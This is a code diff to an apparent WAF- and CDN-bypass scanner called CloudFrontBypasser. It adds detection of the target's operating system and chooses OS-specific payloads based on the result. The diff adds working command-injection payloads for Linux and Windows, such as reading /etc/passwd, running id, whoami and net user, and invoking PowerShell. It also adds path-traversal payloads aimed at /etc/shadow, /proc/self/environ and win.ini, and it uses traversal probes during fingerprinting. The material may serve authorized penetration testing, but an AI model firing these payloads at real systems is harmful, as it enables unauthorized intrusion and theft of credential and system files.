@@ -288,6 +288,163 @@ TECHNOLOGY_SIGNATURES = {
     },
 }
 
+# Operating System Detection Signatures
+OS_SIGNATURES = {
+    'linux': {
+        'server_patterns': ['ubuntu', 'debian', 'centos', 'fedora', 'red hat', 'rhel', 'alpine', 'arch'],
+        'header_patterns': ['unix', 'linux'],
+        'path_indicators': ['/etc/', '/var/', '/usr/', '/home/', '/bin/', '/opt/'],
+        'error_patterns': ['errno', 'permission denied', '/proc/', 'bash:', 'sh:'],
+        'framework_indicators': ['nginx', 'apache/2', 'gunicorn', 'uwsgi', 'mod_wsgi'],
+    },
+    'windows': {
+        'server_patterns': ['microsoft', 'windows', 'iis/', 'win32', 'win64', 'asp.net'],
+        'header_patterns': ['windows', 'microsoft', 'iis', 'asp.net'],
+        'path_indicators': ['c:\\', 'd:\\', 'c:/', 'd:/', 'windows\\', 'program files', 'inetpub'],
+        'error_patterns': ['win32', 'aspnet', 'iis', '.dll', 'system32', 'cmd.exe', 'powershell'],
+        'framework_indicators': ['iis/', 'asp.net', 'x-aspnet', 'microsoft-iis'],
+    },
+}
+
+# Technique to OS Compatibility Mapping
+# 'all' means works on all systems, 'linux' means Linux/Unix only, 'windows' means Windows only
+TECHNIQUE_OS_COMPATIBILITY = {
+    # Header Manipulation - works on all systems
+    '_test_host_header_injection': 'all',
+    '_test_x_forwarded_for': 'all',
+    '_test_x_forwarded_host': 'all',
+    '_test_x_original_url': 'all',
+    '_test_header_injection': 'all',
+    '_test_origin_header_bypass': 'all',
+    '_test_custom_header_fuzzing': 'all',
+    '_test_ip_spoofing_headers': 'all',
+    '_test_host_header_attacks': 'all',
+    
+    # Encoding & Obfuscation - works on all systems
+    '_test_encoding_bypass': 'all',
+    '_test_double_encoding': 'all',
+    '_test_case_manipulation': 'all',
+    '_test_comment_injection': 'all',
+    '_test_whitespace_manipulation': 'all',
+    '_test_unicode_normalization': 'all',
+    '_test_payload_mutation': 'all',
+    '_test_polyglot_payloads': 'all',
+    '_test_path_normalization_extended': 'all',
+    
+    # Protocol-Level - works on all systems
+    '_test_method_bypass': 'all',
+    '_test_http_method_override': 'all',
+    '_test_content_type_bypass': 'all',
+    '_test_http_parameter_pollution': 'all',
+    '_test_transfer_encoding_smuggling': 'all',
+    '_test_http2_downgrade': 'all',
+    '_test_http2_specific_attacks': 'all',
+    '_test_websocket_upgrade': 'all',
+    '_test_websocket_security': 'all',
+    '_test_chunked_transfer': 'all',
+    '_test_http_pipelining': 'all',
+    '_test_request_smuggling_v2': 'all',
+    '_test_http_desync': 'all',
+    '_test_verb_tampering_extended': 'all',
+    '_test_multipart_bypass': 'all',
+    
+    # Cache & Control - works on all systems
+    '_test_cache_control': 'all',
+    '_test_range_header': 'all',
+    '_test_cache_poisoning': 'all',
+    '_test_web_cache_deception': 'all',
+    '_test_range_header_attacks': 'all',
+    
+    # Injection Testing - OS-specific payloads
+    '_test_sqli_bypass': 'all',  # SQL injection is database-level, not OS
+    '_test_xss_bypass': 'all',  # XSS is browser/client-side
+    '_test_command_injection_bypass': 'linux',  # Uses Linux commands (ls, cat, etc.)
+    '_test_command_injection_windows': 'windows',  # Uses Windows commands (dir, type, etc.)
+    '_test_path_traversal_bypass': 'all',  # Has separate Linux/Windows payloads
+    '_test_nosql_injection': 'all',
+    '_test_ldap_injection': 'all',
+    '_test_ssti_detection': 'all',
+    '_test_xxe_detection': 'all',
+    '_test_crlf_injection': 'all',
+    '_test_prototype_pollution': 'all',
+    '_test_json_injection': 'all',
+    '_test_deserialization': 'all',
+    '_test_ssi_injection': 'linux',  # SSI mainly on Apache/Linux
+    '_test_log4shell_patterns': 'all',  # Java-based, OS independent
+    '_test_dangling_markup': 'all',
+    '_test_css_injection': 'all',
+    '_test_xslt_injection': 'all',
+    
+    # Security Misconfigurations - works on all systems
+    '_test_cors_misconfiguration': 'all',
+    '_test_open_redirect': 'all',
+    '_test_security_headers': 'all',
+    '_test_cookie_security': 'all',
+    '_test_clickjacking': 'all',
+    '_test_content_sniffing': 'all',
+    '_test_response_splitting': 'all',
+    
+    # Business Logic - works on all systems
+    '_test_api_versioning_bypass': 'all',
+    '_test_mass_assignment': 'all',
+    '_test_idor_detection': 'all',
+    '_test_business_logic_flaws': 'all',
+    '_test_email_header_injection': 'all',
+    '_test_file_upload_bypass': 'all',
+    '_test_rate_limit_detection': 'all',
+    '_test_race_condition': 'all',
+    
+    # JWT & Auth - works on all systems
+    '_test_jwt_oauth_bypass': 'all',
+    '_test_jwt_attacks': 'all',
+    
+    # GraphQL - works on all systems
+    '_test_graphql_bypass': 'all',
+    '_test_graphql_deep_testing': 'all',
+    
+    # SSRF - works on all systems but metadata endpoints may differ
+    '_test_ssrf_bypass': 'all',
+    '_test_ssrf_protocol_smuggling': 'all',
+    '_test_dns_rebinding': 'all',
+    
+    # PDF/Document - works on all systems
+    '_test_pdf_injection': 'all',
+    '_test_postmessage_vulnerabilities': 'all',
+    '_test_rpo_attack': 'all',
+    
+    # Cloud Security - works on all systems (cloud-agnostic)
+    '_test_azure_blob_enumeration': 'all',
+    '_test_gcp_bucket_discovery': 'all',
+    '_test_serverless_functions': 'all',
+    '_test_kubernetes_api': 'all',
+    '_test_cloud_provider_detection': 'all',
+    '_test_cloud_metadata_enumeration': 'all',
+    
+    # Advanced Payloads - mixed
+    '_test_time_based_detection': 'all',
+    '_test_buffer_limits': 'all',
+    '_test_integer_overflow': 'all',
+    '_test_bot_detection_evasion': 'all',
+    '_test_ipv6_bypass': 'all',
+    
+    # Info Disclosure - works on all systems
+    '_test_information_disclosure': 'all',
+    '_test_subdomain_takeover': 'all',
+    '_test_api_key_exposure': 'all',
+    '_test_timing_based_discovery': 'all',
+    '_test_error_based_disclosure': 'all',
+    
+    # Detection & Recon - works on all systems
+    '_detect_waf_rule_version': 'all',
+    '_detect_javascript_waf': 'all',
+    '_test_api_endpoint_discovery': 'all',
+    '_test_dns_zone_transfer': 'all',
+    '_enumerate_subdomains': 'all',
+    '_historical_dns_lookup': 'all',
+    '_certificate_transparency_lookup': 'all',
+    '_fingerprint_technology_stack': 'all',
+}
+
 # ==================== SCAN CATEGORIES ====================
 # Organized categories for GUI selection
 SCAN_CATEGORIES = {
@@ -360,6 +517,7 @@ SCAN_CATEGORIES = {
             '_test_sqli_bypass',
             '_test_xss_bypass',
             '_test_command_injection_bypass',
+            '_test_command_injection_windows',
             '_test_path_traversal_bypass',
             '_test_nosql_injection',
             '_test_ldap_injection',
@@ -762,7 +920,13 @@ class CloudFrontBypasser:
         if cdn_results:
             self.results.extend(cdn_results)
         
-        print("\n[*] Phase 2: Testing bypass techniques...")
+        # Detect target operating system
+        print("\n[*] Phase 2: OS Detection...")
+        detected_os, os_confidence, os_results = self._detect_target_os()
+        if os_results:
+            self.results.extend(os_results)
+        
+        print("\n[*] Phase 3: Testing bypass techniques...")
         
         # Build technique list based on selected categories
         techniques = []
@@ -814,6 +978,7 @@ class CloudFrontBypasser:
             '_test_sqli_bypass': self._test_sqli_bypass,
             '_test_xss_bypass': self._test_xss_bypass,
             '_test_command_injection_bypass': self._test_command_injection_bypass,
+            '_test_command_injection_windows': self._test_command_injection_windows,
             '_test_path_traversal_bypass': self._test_path_traversal_bypass,
             '_test_nosql_injection': self._test_nosql_injection,
             '_test_ldap_injection': self._test_ldap_injection,
@@ -890,7 +1055,16 @@ class CloudFrontBypasser:
                         techniques.append(technique_map[technique_name])
                         added_techniques.add(technique_name)
         
-        print(f"[*] Running {len(techniques)} techniques from {len(selected_categories)} categories\n")
+        # Filter techniques based on detected OS
+        original_count = len(techniques)
+        techniques = self._filter_techniques_by_os(techniques, detected_os)
+        filtered_count = original_count - len(techniques)
+        
+        if filtered_count > 0:
+            print(f"[*] Running {len(techniques)} techniques from {len(selected_categories)} categories")
+            print(f"    ({filtered_count} techniques filtered out - not compatible with {detected_os.upper() if detected_os != 'unknown' else 'detected OS'})\n")
+        else:
+            print(f"[*] Running {len(techniques)} techniques from {len(selected_categories)} categories\n")
         
         # Execute techniques with error handling
         error_count = 0
@@ -1518,6 +1692,178 @@ class CloudFrontBypasser:
             logger.error(f"CDN detection error: {e}")
         
         return results
+    
+    def _detect_target_os(self) -> Tuple[str, int, List[Dict[str, Any]]]:
+        """
+        Detect the target server's operating system.
+        
+        Returns:
+            Tuple of (os_name, confidence, results_list)
+            os_name: 'linux', 'windows', or 'unknown'
+            confidence: 0-100 indicating detection confidence
+            results_list: List of detection results for reporting
+        """
+        print("  [*] Detecting target operating system...")
+        results = []
+        os_scores = {'linux': 0, 'windows': 0}
+        os_indicators = {'linux': [], 'windows': []}
+        
+        try:
+            # Make initial request
+            resp = safe_request(self.target, timeout=self.timeout, allow_redirects=True)
+            if not resp:
+                print("  [!] Could not detect OS - target unreachable")
+                return 'unknown', 0, results
+            
+            headers_lower = {k.lower(): v.lower() for k, v in resp.headers.items()}
+            server_header = headers_lower.get('server', '').lower()
+            powered_by = headers_lower.get('x-powered-by', '').lower()
+            body_lower = resp.text.lower()[:10000]  # Check first 10KB
+            
+            # Check each OS signature
+            for os_name, signatures in OS_SIGNATURES.items():
+                # Check server header patterns
+                for pattern in signatures.get('server_patterns', []):
+                    if pattern in server_header or pattern in powered_by:
+                        os_scores[os_name] += 35
+                        os_indicators[os_name].append(f"Server: {pattern}")
+                
+                # Check header patterns
+                for pattern in signatures.get('header_patterns', []):
+                    for header_val in headers_lower.values():
+                        if pattern in header_val:
+                            os_scores[os_name] += 20
+                            os_indicators[os_name].append(f"Header: {pattern}")
+                            break
+                
+                # Check path indicators in body (leaked paths)
+                for indicator in signatures.get('path_indicators', []):
+                    if indicator.lower() in body_lower:
+                        os_scores[os_name] += 15
+                        os_indicators[os_name].append(f"Path: {indicator}")
+                
+                # Check error patterns
+                for pattern in signatures.get('error_patterns', []):
+                    if pattern in body_lower:
+                        os_scores[os_name] += 25
+                        os_indicators[os_name].append(f"Error: {pattern}")
+                
+                # Check framework indicators
+                for indicator in signatures.get('framework_indicators', []):
+                    if indicator in server_header or indicator in powered_by:
+                        os_scores[os_name] += 30
+                        os_indicators[os_name].append(f"Framework: {indicator}")
+            
+            # Try triggering errors to reveal OS info
+            error_test_paths = [
+                "/../../../../../etc/passwd%00",  # Linux path
+                "/../../../../../windows/win.ini%00",  # Windows path
+                "/..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",  # Windows backslash
+            ]
+            
+            for path in error_test_paths:
+                try:
+                    err_resp = safe_request(f"{self.target}{path}", timeout=self.timeout)
+                    if err_resp and err_resp.status_code in [400, 403, 404, 500]:
+                        err_body = err_resp.text.lower()[:5000]
+                        
+                        # Check for OS-specific error messages
+                        if any(x in err_body for x in ['\\windows\\', 'c:\\', 'system32', 'inetpub', 'iis']):
+                            os_scores['windows'] += 30
+                            os_indicators['windows'].append("Error response: Windows path")
+                        
+                        if any(x in err_body for x in ['/etc/', '/var/', '/usr/', '/home/', 'permission denied']):
+                            os_scores['linux'] += 30
+                            os_indicators['linux'].append("Error response: Linux path")
+                except Exception:
+                    pass
+            
+            # Determine detected OS
+            linux_score = min(os_scores['linux'], 100)
+            windows_score = min(os_scores['windows'], 100)
+            
+            if linux_score > windows_score and linux_score >= 30:
+                detected_os = 'linux'
+                confidence = linux_score
+                indicators = os_indicators['linux']
+            elif windows_score > linux_score and windows_score >= 30:
+                detected_os = 'windows'
+                confidence = windows_score
+                indicators = os_indicators['windows']
+            else:
+                detected_os = 'unknown'
+                confidence = 0
+                indicators = []
+            
+            # Create result entry
+            if detected_os != 'unknown':
+                result = {
+                    'technique': f'OS Detection: {detected_os.upper()}',
+                    'bypass': False,
+                    'status': resp.status_code,
+                    'reason': f"Confidence: {confidence}% - {', '.join(indicators[:3])}",
+                    'severity': 'INFO',
+                    'category': 'OS_DETECTION',
+                    'details': {
+                        'detected_os': detected_os,
+                        'confidence': confidence,
+                        'indicators': indicators,
+                        'all_scores': os_scores
+                    }
+                }
+                results.append(result)
+                print(f"  [+] Detected OS: {detected_os.upper()} (Confidence: {confidence}%)")
+                
+                if indicators:
+                    for ind in indicators[:3]:
+                        print(f"      - {ind}")
+            else:
+                print("  [*] Could not determine target OS - will use universal exploits")
+            
+            # Store for later use
+            self._detected_os = detected_os
+            self._os_confidence = confidence
+            
+            return detected_os, confidence, results
+            
+        except Exception as e:
+            logger.debug(f"OS detection error: {e}")
+            print(f"  [!] OS detection error: {e}")
+            return 'unknown', 0, results
+    
+    def _filter_techniques_by_os(self, techniques: List, detected_os: str) -> List:
+        """
+        Filter techniques based on detected operating system.
+        
+        Args:
+            techniques: List of technique methods
+            detected_os: Detected OS ('linux', 'windows', or 'unknown')
+        
+        Returns:
+            Filtered list of techniques compatible with the detected OS
+        """
+        if detected_os == 'unknown':
+            # If OS unknown, use all techniques
+            return techniques
+        
+        filtered = []
+        skipped_count = 0
+        
+        for technique in techniques:
+            technique_name = technique.__name__
+            compatibility = TECHNIQUE_OS_COMPATIBILITY.get(technique_name, 'all')
+            
+            # Include if compatible with all, or matches detected OS
+            if compatibility == 'all' or compatibility == detected_os:
+                filtered.append(technique)
+            else:
+                skipped_count += 1
+                logger.debug(f"Skipping {technique_name} - not compatible with {detected_os}")
+        
+        if skipped_count > 0:
+            print(f"  [*] Filtered out {skipped_count} techniques incompatible with {detected_os.upper()}")
+        
+        return filtered
 
     # ============================================================================
     # HEADER-BASED SCANS
@@ -1735,29 +2081,84 @@ class CloudFrontBypasser:
         return self._batch_test(test_cases)
     
     def _test_command_injection_bypass(self) -> List[Dict[str, Any]]:
-        """OS command injection evasion - optimized batch"""
+        """OS command injection evasion (Linux/Unix) - optimized batch"""
         cmd_payloads = [
             "/?cmd=;ls",
             "/?cmd=|ls",
             "/?cmd=`ls`",
             "/?cmd=$(ls)",
             "/?cmd=;ls${IFS}-la",
+            "/?cmd=;cat${IFS}/etc/passwd",
+            "/?cmd=|cat${IFS}/etc/passwd",
+            "/?cmd=;id",
+            "/?cmd=|whoami",
+            "/?cmd=$(uname${IFS}-a)",
         ]
         test_cases = [
-            {'headers': {}, 'path': path, 'technique': f'Command Injection: {path[:30]}'}
+            {'headers': {}, 'path': path, 'technique': f'Command Injection (Linux): {path[:30]}'}
+            for path in cmd_payloads
+        ]
+        return self._batch_test(test_cases)
+    
+    def _test_command_injection_windows(self) -> List[Dict[str, Any]]:
+        """Windows command injection evasion - optimized batch"""
+        cmd_payloads = [
+            "/?cmd=|dir",
+            "/?cmd=&dir",
+            "/?cmd=||dir",
+            "/?cmd=&&dir",
+            "/?cmd=|type+c:\\windows\\win.ini",
+            "/?cmd=&type+c:\\windows\\system.ini",
+            "/?cmd=|whoami",
+            "/?cmd=&hostname",
+            "/?cmd=|net+user",
+            "/?cmd=|set",
+            "/?cmd=|echo+%USERNAME%",
+            "/?cmd=;cmd+/c+dir",
+            "/?cmd=|powershell+-c+dir",
+        ]
+        test_cases = [
+            {'headers': {}, 'path': path, 'technique': f'Command Injection (Windows): {path[:30]}'}
             for path in cmd_payloads
         ]
         return self._batch_test(test_cases)
     
     def _test_path_traversal_bypass(self) -> List[Dict[str, Any]]:
-        """Directory traversal evasion - optimized batch"""
-        traversal_paths = [
-            "/../../../etc/passwd",
-            "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
-            "/%252e%252e/%252e%252e/etc/passwd",
-            "/..%c0%af..%c0%af/etc/passwd",
-            "/../../../etc/passwd%00",
-        ]
+        """Directory traversal evasion - OS aware, optimized batch"""
+        # Check detected OS and use appropriate payloads
+        detected_os = getattr(self, '_detected_os', 'unknown')
+        
+        # Common traversal payloads that work on both
+        traversal_paths = []
+        
+        if detected_os in ['linux', 'unknown']:
+            # Linux/Unix specific paths
+            traversal_paths.extend([
+                "/../../../etc/passwd",
+                "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+                "/%252e%252e/%252e%252e/etc/passwd",
+                "/..%c0%af..%c0%af/etc/passwd",
+                "/../../../etc/passwd%00",
+                "/....//....//....//etc/passwd",
+                "/../../../etc/shadow",
+                "/../../../proc/self/environ",
+                "/..%252f..%252f..%252fetc/passwd",
+            ])
+        
+        if detected_os in ['windows', 'unknown']:
+            # Windows specific paths
+            traversal_paths.extend([
+                "/../../../windows/win.ini",
+                "/%2e%2e/%2e%2e/windows/win.ini",
+                "/..%5c..%5c..%5cwindows%5cwin.ini",
+                "/..%255c..%255c..%255cwindows%255cwin.ini",
+                "/../../../windows/system.ini",
+                "/..%c0%af..%c0%af/windows/win.ini",
+                "/../../../windows/system32/drivers/etc/hosts",
+                "/....\\....\\....\\windows\\win.ini",
+                "/%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
+            ])
+        
         test_cases = [
             {'headers': {}, 'path': path, 'technique': f'Path Traversal: {path[:30]}'}
             for path in traversal_paths
